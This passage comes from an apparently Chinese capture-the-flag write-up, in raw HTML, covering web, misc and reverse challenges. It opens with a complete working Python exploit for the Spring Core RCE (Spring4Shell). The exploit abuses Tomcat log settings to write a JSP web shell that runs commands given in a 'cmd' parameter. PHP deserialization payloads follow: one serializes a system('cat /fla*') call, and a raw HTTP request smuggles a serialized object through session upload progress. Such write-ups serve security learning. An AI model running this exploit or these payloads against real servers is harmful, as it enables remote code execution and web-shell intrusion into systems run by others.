class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Author: @Rezn0k</span><br><span class="hljs-comment"># Based off the work of p1n93r</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># Set to bypass errors if the target site has SSL issues</span><br>requests.packages.urllib3.disable_warnings()<br><br>post_headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>&#125;<br><br>get_headers = &#123;<br>    <span class="hljs-string">&quot;prefix&quot;</span>: <span class="hljs-string">&quot;&lt;%&quot;</span>,<br>    <span class="hljs-string">&quot;suffix&quot;</span>: <span class="hljs-string">&quot;%&gt;//&quot;</span>,<br>    <span class="hljs-comment"># This may seem strange, but this seems to be needed to bypass some check that looks for &quot;Runtime&quot; in the log_pattern</span><br>    <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;Runtime&quot;</span>,<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_exploit</span>(<span class="hljs-params">url, directory, filename</span>):<br>    log_pattern = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20&quot;</span> \<br>                  <span class="hljs-string">f&quot;java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter&quot;</span> \<br>                  <span class="hljs-string">f&quot;(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B&quot;</span> \<br>                  <span class="hljs-string">f&quot;%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&quot;</span><br><br>    log_file_suffix = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&quot;</span><br>    log_file_dir = <span class="hljs-string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.directory=<span class="hljs-subst">&#123;directory&#125;</span>&quot;</span><br>    log_file_prefix = <span class="hljs-string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.prefix=<span class="hljs-subst">&#123;filename&#125;</span>&quot;</span><br>    log_file_date_format = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span><br><br>    exp_data = <span class="hljs-string">&quot;&amp;&quot;</span>.join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])<br><br>    <span class="hljs-comment"># Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times</span><br>    <span class="hljs-comment"># If re-running the exploit, this will create an artifact of &#123;old_file_name&#125;_.jsp</span><br>    file_date_data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Resetting Log Variables.&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br>    <span class="hljs-comment"># Change the tomcat log location variables</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Modifying Log Configurations&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=exp_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br>    <span class="hljs-comment"># Changes take some time to populate on tomcat</span><br>    time.sleep(<span class="hljs-number">3</span>)<br><br>    <span class="hljs-comment"># Send the packet that writes the web shell</span><br>    ret = requests.get(url, headers=get_headers, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response Code: %d&quot;</span> % ret.status_code)<br><br>    time.sleep(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># Reset the pattern to prevent future writes into the file</span><br>    pattern_data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Resetting Log Variables.&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Spring Core RCE&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--url&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;File to write to [no extension]&#x27;</span>, required=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;shell&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--dir&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Directory to write to. Suggest using &quot;webapps/[appname]&quot; of target app&#x27;</span>,<br>                        required=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;webapps/ROOT&quot;</span>)<br><br>    file_arg = parser.parse_args().file<br>    dir_arg = parser.parse_args().<span class="hljs-built_in">dir</span><br>    url_arg = parser.parse_args().url<br><br>    filename = file_arg.replace(<span class="hljs-string">&quot;.jsp&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> url_arg <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Must pass an option for --url&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">try</span>:<br>        run_exploit(url_arg, dir_arg, filename)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Exploit completed&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Check your target for a shell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] File: &quot;</span> + filename + <span class="hljs-string">&quot;.jsp&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> dir_arg:<br>            location = urlparse(url_arg).scheme + <span class="hljs-string">&quot;://&quot;</span> + urlparse(url_arg).netloc + <span class="hljs-string">&quot;/&quot;</span> + filename + <span class="hljs-string">&quot;.jsp&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            location = <span class="hljs-string">f&quot;Unknown. Custom directory used. (try app/<span class="hljs-subst">&#123;filename&#125;</span>.jsp?cmd=id&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Shell should be at: <span class="hljs-subst">&#123;location&#125;</span>?cmd=id&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-web2-1.png"></p><h2 id="PHP反序列化2"><a href="#PHP反序列化2" class="headerlink" title="PHP反序列化2"></a>PHP反序列化2</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ClassObj</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">easy</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ClassObj-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">easy</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello Hacker&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;file);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;eval&#x27;</span>)!==False)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker&lt;/br&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)!==False) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker&lt;/br&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$user</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">main</span>();<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$ClassObj</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;system(&quot;cat /fla*&quot;);&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">main</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="phpti"><a href="#phpti" class="headerlink" title="phpti"></a>phpti</h2><p>字符串逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;r11.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;phpinfo()&#x27;</span>,<span class="hljs-string">&#x27;phpinfo()up&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]<br><span class="hljs-variable">$password</span>=<span class="hljs-number">123456</span>;<br><span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));<br><span class="hljs-variable">$test</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure><p><code>?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;&#125;</code></p><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">admin</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$root</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;root;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;3123123123123\n&quot;</span>;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;root ===<span class="hljs-string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123412341234&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;aaaaaaaa&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>host:port<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>369<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary7Pufxj5tsIY9p2yA<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=n480589952d85l2vvkeb01sh9g<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">123</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;|O:5:\&quot;<span class="hljs-keyword">admin</span>\&quot;:1:&#123;s:4:\&quot;root\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA--</span></span><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="不要被迷惑"><a href="#不要被迷惑" class="headerlink" title="不要被迷惑"></a>不要被迷惑</h2><p>筛选<code>http</code>协议的包，找到<code>flag.zip</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-misc1-1.png"></p><p>导出压缩包后爆破密码，得到<code>123321</code></p><p>得到一串jjencode编码字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$=~[];$=&#123;<span class="hljs-attr">___</span>:++$,<span class="hljs-attr">$$$$</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">__$</span>:++$,<span class="hljs-attr">$_$_</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">_$_</span>:++$,<span class="hljs-attr">$_$$</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$$_$</span>:($[$]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">_$$</span>:++$,<span class="hljs-attr">$$$_</span>:(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$__</span>:++$,<span class="hljs-attr">$_$</span>:++$,<span class="hljs-attr">$$__</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$$_</span>:++$,<span class="hljs-attr">$$$</span>:++$,<span class="hljs-attr">$___</span>:++$,<span class="hljs-attr">$__$</span>:++$&#125;;$.$_=($.$_=$+<span class="hljs-string">&quot;&quot;</span>)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+<span class="hljs-string">&quot;&quot;</span>)[$.__$])+((!$)+<span class="hljs-string">&quot;&quot;</span>)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$.__$])+($._=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+<span class="hljs-string">&quot;\&quot;&quot;</span>+$.$$$$+(![]+<span class="hljs-string">&quot;&quot;</span>)[$._$_]+$.$_$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$__+$.$$$+<span class="hljs-string">&quot;&#123;\\&quot;</span>+$.__$+$._$_+$.$$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.$_$+$._+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$._$_+$.$$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.___+(![]+<span class="hljs-string">&quot;&quot;</span>)[$._$_]+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$_$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$$+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.__$+$.$$_$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.$__+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$._$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$$+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$._$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$$+$.__$+$.__+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$.$$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$$+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$__+$._$+<span class="hljs-string">&quot;&#125;&quot;</span>+<span class="hljs-string">&quot;\&quot;&quot;</span>)())();<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-misc1-2.png"></p><h2 id="PCAP文件分析"><a href="#PCAP文件分析" class="headerlink" title="PCAP文件分析"></a>PCAP文件分析</h2><p><code>flag.pcapng</code>找到没用的<code>flag.zip</code></p><p><code>02.pcapng</code>提取出一个<code>02.zip</code>，一个<code>2.png</code></p><p><code>2.png</code>上看到压缩包密码<code>Vu8#fI9</code>，解压得到<code>flag2.png</code></p><p>修改<code>flag2.png</code>高度得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-misc2-1.png"></p><h2 id="平正开"><a href="#平正开" class="headerlink" title="平正开"></a>平正开</h2><p><em>赛后复现</em></p><p>每一位取反后加一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i)==<span class="hljs-number">0</span>:<br>        f.write(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0xff</span>)+<span class="hljs-number">1</span>,<span class="hljs-built_in">ord</span>(i))<br>    f.write(<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0xff</span>)+<span class="hljs-number">1</span>))<br>f.close()<br></code></pre></td></tr></table></figure><p>伪加密后得到一串<code>社会主义核心价值观加密</code>字符串，解密得到flag</p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="re2"><a href="#re2" class="headerlink" 